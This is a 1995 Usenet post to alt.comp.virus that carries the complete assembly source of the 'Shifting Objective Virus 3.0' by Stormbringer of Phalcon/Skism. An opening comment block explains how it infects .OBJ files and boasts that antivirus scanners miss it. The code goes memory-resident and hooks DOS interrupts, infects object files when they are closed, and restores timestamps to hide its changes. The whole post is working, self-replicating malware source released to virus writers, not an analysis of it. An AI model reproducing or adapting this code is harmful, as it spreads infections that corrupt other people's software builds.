From netcom.com!ix.netcom.com!howland.reston.ans.net!gatech!bloom-beacon.mit.edu!news.media.mit.edu!tmok.res.wpi.edu!halflife Sat Jan 14 12:23:41 1995
Xref: netcom.com alt.comp.virus:1000
Newsgroups: alt.comp.virus
Path: netcom.com!ix.netcom.com!howland.reston.ans.net!gatech!bloom-beacon.mit.edu!news.media.mit.edu!tmok.res.wpi.edu!halflife
From: halflife@tmok.res.wpi.edu (Halflife)
Subject: shifting obj
Message-ID: <halflife.21.000B93F3@tmok.res.wpi.edu>
Lines: 437
Sender: news@news.media.mit.edu (USENET News System)
Organization: MIT Media Laboratory
X-Newsreader: Trumpet for Windows [Version 1.0 Rev A]
Date: Fri, 13 Jan 1995 16:34:35 GMT
Lines: 437

;+----------------------------------------------------------------------+
;¦  Shifting Objective Virus 3.0 (c) 1994 Stormbringer [Phalcon/Skism]  ¦
;¦                                                                      ¦
;¦  Memory Resident .OBJ Infector - No TBSCAN Flags, No F-Prot Alarms!  ¦
;¦                                                                      ¦
;¦  This virus breaks new bounds in viral technology, best I know }-)   ¦
;¦It infects .OBJ files that are set up to compile to simple, stand-    ¦
;¦alone .COM's.  The basic theory for this is the following:  It takes  ¦
;¦the pre-set compiling points of the modules in the .OBJ and moves them¦
;¦up in memory so Objective will have room to insert itself underneath. ¦
;¦When the file is compiled the virus is at the beginning of the file,  ¦
;¦and the original code follows BUT - the original code's memory offsets¦
;¦are what they were BEFORE the virus infected the .OBJ.  Therefore, all¦
;¦Objective has to do when it runs is go memory resident, and shift the ¦
;¦host code back down to where it starts at 100h in memory, and all is  ¦
;¦well.                                                                 ¦
;¦                                                                      ¦
;¦  Object files are basically a set of linked lists or fields, each    ¦
;¦with a three byte header.  The first byte is it's identity byte, while¦
;¦the following word is the size of the field - header.  The very last  ¦
;¦byte of each record is a simple checksum byte - this can be gained    ¦
;¦simply by adding up all of the bytes in the field save the three byte ¦
;¦header and taking the negative (not reg/inc reg) so that the entire   ¦
;¦field value + checksum = 0.  Each field type has it's own identity    ¦
;¦value, but we are only concerned with a few right now.                ¦
;¦                                                                      ¦
;¦They are as follows:                                                  ¦
;¦             80h  -  Starting field of a .OBJ file                    ¦
;¦             8Ch  -  External definitions                             ¦
;¦             8Ah  -  Ending field of a .OBJ file                      ¦
;¦             A0h  -  Regular Code                                     ¦
;¦             A2h  -  Compressed code (patterns/reiterated stuff)      ¦
;¦                                                                      ¦
;¦   In the A0h and A2h types of fields, there is one more thing that   ¦
;¦concerns us - the three bytes after the field size in the header      ¦
;¦are indicators of the location in memory the code will be at - the    ¦
;¦second and third byte form the word we will be concerned with, which  ¦
;¦is a simple offset from CS:0000 that the code will begin.  Since we   ¦
;¦are dealing with .COM files and want to put our virus at the beginning¦
;¦of the file, we set the position field of the virus to 100h and the   ¦
;¦positions of all the other A0h and A2h fields to their old position   ¦
;¦plus the virus size.  When the file is compiled, the virus will be    ¦
;¦at the beginning and the host will follow.  Attaching the virus to    ¦
;¦the .OBJ itself is simple enough - just save the 8Ah field in memory, ¦
;¦and write FROM IT'S OLD BEGINNING a header for your virus, your       ¦
;¦virus, then a checksum and the old 8Ah field.  At all times when      ¦
;¦modifying fields, the checksums must be fixed afterwards.             ¦
;¦                                                                      ¦
;¦   For the rest of the techniques that may be useful, I suggest you   ¦
;¦look at the following code for my Shifting Objective Virus.  I'd like ¦
;¦to thank The Nightmare for his ideas on this when we sat around bored ¦
;¦those days.  Greets go out to all of Phalcon/Skism, Urnst Kouch,      ¦
;¦Mark Ludwig, TridenT, NuKE, and the rest of the viral community.      ¦
;¦A special hello goes to Hermanni and Frisk.                           ¦
;¦                                                                      ¦
;¦                                           -  Stormbringer [P/S]      ¦
;¦                                         --¤-------------------       ¦
;¦                                           -                          ¦
;+----------------------------------------------------------------------+
.model tiny
.radix 16
.code
        org 100
start:
        push    ds
        sub     ax,ax
        mov     ds,ax
        mov     ax,word ptr ds:[84]
        mov     word ptr cs:[Fake21IP],ax
        mov     ax,word ptr ds:[86]
        mov     word ptr cs:[Fake21CS],ax
        mov     ax,word ptr ds:[2f*4]
        mov     word ptr cs:[Fake2fIP],ax
        mov     ax,word ptr ds:[2f*4+2]
        mov     word ptr cs:[Fake2fCS],ax
        pop     ds

CheckIfResident:
        mov     ax,0feadh               ;Check if we are in memory
        call    fake21
        cmp     ax,0d00dh
        jne     ReserveMemory           ;Nope, go resident

        xor     ax,ax
        mov     ds,ax
        jmp     RestoreFile             ;Yep, skip it

ReserveMemory:
        mov     ax,ds
        dec     ax                      ;Go to MCB's
        mov     ds,ax
        sub     word ptr ds:[3],80      ;Grab 2K from this MCB
        sub     word ptr ds:[12],80     ;And from the Top of MEM in PSP
        xor     ax,ax
        mov     ds,ax                   ;We're gonna take up 2k in memory.
        sub     word ptr ds:[413],2     ;Reserve 2k from bios
        int     12h                     ;Get bios memory amount in K
        mov     cl,6
        shl     ax,cl

PutVirusInMemory:
        push    cs
        pop     ds
        sub     ax,10                   ;NewSeg:0 was in AX, now Newseg:100
        mov     es,ax                   ;is start of reserved memory field....
        mov     di,100
        mov     si,100
        mov     cx,end_prog-start
        repnz   movsb                   ;Copy virus into memory

HookInterrupts:
        xor     ax,ax
        mov     ds,ax                   ;Hook Int 21h directly using
        cli                             ;Interrupt table
        mov     ax,offset Int21
        xchg    word ptr ds:[84],ax
        mov     word ptr es:[IP_21],ax
        mov     ax,es
        xchg    word ptr ds:[86],ax
        mov     word ptr es:[CS_21],ax
        sti


RestoreFile:
        push    cs
        pop     es
        mov     ax,0deadh       ;Call interrupt handler to restore file

        pushf
        call    dword ptr ds:[84]

        mov     ax,4c01         ;Terminate if restore unsuccessful
        call    fake21

InstallCHeck:
        mov     ax,0d00dh       ;Tell prog we're already here
        iret

Int21:
        cmp     ax,0feadh
        je      InstallCheck    ;Is it an install check?
        cmp     ax,0deadh
        je      RestoreHost     ;Or a restoration request?
        cmp     ah,3e
        jz      fileclose       ;Fileclose - go infect it if it's an .OBJ
GoInt21:
        db      0ea             ;Jump back into int 21h handler
IP_21   dw      0
CS_21   dw      0

RestoreHost:
        push    es
        pop     ds

        mov     di,sp           ;Set iret to return to beginning of code
        mov     [di],100

        mov     di,100
        mov     si,offset Host  ;Shift host back down over virus in memory
        mov     cx,0f000
        repnz   movsb

        mov     si,ax
        xor     ax,ax
        mov     bx,ax           ;Set registers as if just executing
        mov     cx,ax
        mov     dx,ax
        mov     di,ax
        iret                    ;Iret back into the host file

fileclose:
        pushf
        push    ax bx cx dx es ds si di bp
        xor     ax,ax
        xor     ax,1220h
        call    fake2f
        push    bx
        mov     bl,byte ptr es:[di]     ;Good ol' SFT trick
        mov     ax,1216h
        call    fake2f
        or      word ptr es:[di+2],2    ;Set file Read/Write
        add     di,28
        pop     bx
        cmp     byte ptr es:[di+2],'J'  ;Check out filename
        jne     Done_Close
        cmp     word ptr es:[di],'BO'
        jne     Done_Close
        mov     word ptr cs:[Host_Handle],bx

        mov     ax,5700                 ;Save date/time stamp
        call    fake21
        push    cx dx
        call    Infect_Obj              ;go infect it
        pop     dx cx
        mov     ax,5701                 ;Restore date/time stamp
        call    fake21

   Done_Close:
        pop     bp di si ds es dx cx bx ax      ;Exit and chain into int 21h
        popf
        jmp     GoInt21

Isanexec:
        push    dx
  GetAndSaveCurLoc:
        mov     ax,4201         ;Save position of current module
        xor     cx,cx
        xor     dx,dx
        call    fake21
        push    dx ax
  ModExecStartingPoint:
     ReadOldStartingPoint:
        mov     ah,3f
        mov     dx,offset startingpt    ;Read starting point
        mov     cx,3
        call    fake21
        mov     ax,word ptr [startingpt+1]
        cmp     byte ptr firstexec,0    ;Check if this is the first exec field
        jne     NotFirstExec

                                        ;If so, it should have a starting
                                        ;point of 100h for a .COM for us
                                        ;to infect it correctly

CheckifwillbeCOMfile:                   ;we're assuming that anything with
        mov     byte ptr firstexec,1    ;a starting point of cs:100h will be
                                        ;a com. while this isn't true all
                                        ;the time, we can cross our fingers..
        cmp     ax,100
        je      NotFirstExec            ;File is good, continue infection.

Getouttahere:
        pop     ax ax ax                ;won't be a .com file - don't infect.
        ret

NotFirstExec:                           ;Either it isn't first exec or the
        mov     cx,end_prog-start       ;check was good.. now add virus size
        add     ax,cx                   ;to exec starting point.
        mov     word ptr [startingpt+1],ax
  GoBackToStartingPointinfo:
        pop     dx cx
        push    cx dx
        mov     ax,4200                 ;go back to starting point field
        call    fake21
  AndWriteIt:
        mov     ah,41
        dec     ah
        mov     cx,3
        mov     dx,offset startingpt    ;and save it
        call    fake21

GoToChecksumField:
        mov     dx,fieldsize
        sub     dx,4
        xor     cx,cx                   ;go to checksum field
        mov     ax,4201
        call    fake21
  ResetExecChecksum:
        mov     ah,3f
        mov     dx,offset Checksum      ;read checksum field
        mov     cx,1
        call    fake21
        mov     cx,-1
        mov     dx,-1                   ;go back to checksum field in file
        mov     ax,4201
        call    fake21
        mov     cx,(end_prog-start)
        sub     Checksum,ch             ;modify checksum to account for
        sub     Checksum,cl             ;our change to starting point field.
        mov     ah,41
        mov     dx,offset Checksum      ;and write it
        mov     cx,1
        dec     ah
        call    fake21
  DoneIsExec:
        pop     dx cx
        mov     ax,4200         ;Restore original file pointer
        call    fake21
        pop     dx
        jmp     NExtfield       ;and continue with infection

startingpt db      0,0,0
firstexec   db           0

anexec:
        jmp     isanexec

Bailout:
        ret

Infect_Obj:
        push    cs cs
        pop     es ds
        mov     firstexec,0             ;Init first exec field
        call    go_bof                  ;Go to beginning of file

   ModExecFields:
        call    ReadHeader      ;read the three byte header, field size in DX
                                ;Header type in AL

        cmp     al,8c           ;External module
        je      bailout         ;It has external calls, which we can't
                                ;handle yet :(

        cmp     al,0a0          ;Executable module
        je      anexec

        cmp     al,0a2          ;Reiterated executable module
        je      anexec

        cmp     al,8a           ;Ending module
        je      DoneModExecs

   NextField:
        mov     ax,4201         ;Go to the next field
        xor     cx,cx
        call    fake21
        jmp     ModExecFields

DoneModExecs:
        mov     ax,4201
        mov     cx,-1
        mov     dx,-3           ;go to start of 8A field (end module)
        call    fake21

        push    dx ax

        mov     cx,fieldsize
        add     cx,3+10         ;the +10 is just to be safe
        mov     ah,3f           ;load in last module
        mov     dx,offset buffer
        call    fake21
        mov     endfieldsize,ax ;Read in the end module

        pop     dx cx
        mov     ax,4200         ;Go back to the beginning of the module
        call    fake21              ;now that we have it in memory

WriteOurHeader:
        mov     ah,3f
        mov     cx,endheader-ourheader  ;write the header for virus module
        mov     dx,offset ourheader
        inc     ah
        call    fake21

WriteVirus:
        mov     ah,3f
        mov     cx,end_prog-start       ;write virus to file
        mov     dx,100
        inc     ah
        call    fake21

CreateChecksum:
        mov     si,100
        mov     cx,end_prog-start
        xor     ax,ax
   AddupChecksum:                       ;Create checksum for virus
        lodsb
        add     ah,al
        loop    AddupChecksum
        not     ah
        inc     ah
        mov     Checksum,ah

   WriteChecksum:
        mov     dx,offset Checksum
        mov     cx,1
        mov     ah,3f
        inc     ah
        call    fake21                      ;Then save the checksum in module

WriteEndModule:
        mov     dx,offset Buffer
        mov     cx,endfieldsize
        mov     ah,3f
        inc     ah
        call    fake21                      ;And put the ending module back into
        ret                             ;place.... we're done.


ReadHEader:
        mov     ah,3f
        mov     dx,offset fieldheader
        mov     cx,3                    ;Read module header for .obj files
        call    fake21                      ;save module type in AL and
        mov     al,fieldheader          ;module size in DX
        mov     dx,fieldsize
        ret


Go_Bof:                                 ;Go to beginning of file
        mov     al,0
        jmp     short movefp
Go_Eof:                                 ;Go to the end of the file
        mov     al,02
movefp:                                 ;Or just move the File pointer
        xor     cx,cx
        xor     dx,dx
        mov     ah,42
        call    fake21
        ret

fake21:
        pushf
                db      9a
fake21IP        dw      0
fake21CS        dw      0
        ret

fake2f:
        pushf
                db      9a
fake2fIP        dw      0
fake2fCS        dw      0
        ret

Credits:
db      'Shifting Objective Virus 3.0 (c) 1994 Stormbringer [Phalcon/Skism]'
db      'Kudos go to The Nightmare!'
OurHeader:
        db      0A0
        dw      (end_prog-start+4)      ;our size in an .OBJ file
        db      1
        db      0                       ;starting position (cs:100h)
        db      1
endheader:

endfieldsize    dw      0
Checksum        db      0
fieldheader     db      0
   fieldsize    dw      0
Host_Handle     dw      0
end_prog:
Buffer:
Host            db      90,90,90,90,90,90,90,90,0cdh,20
end start


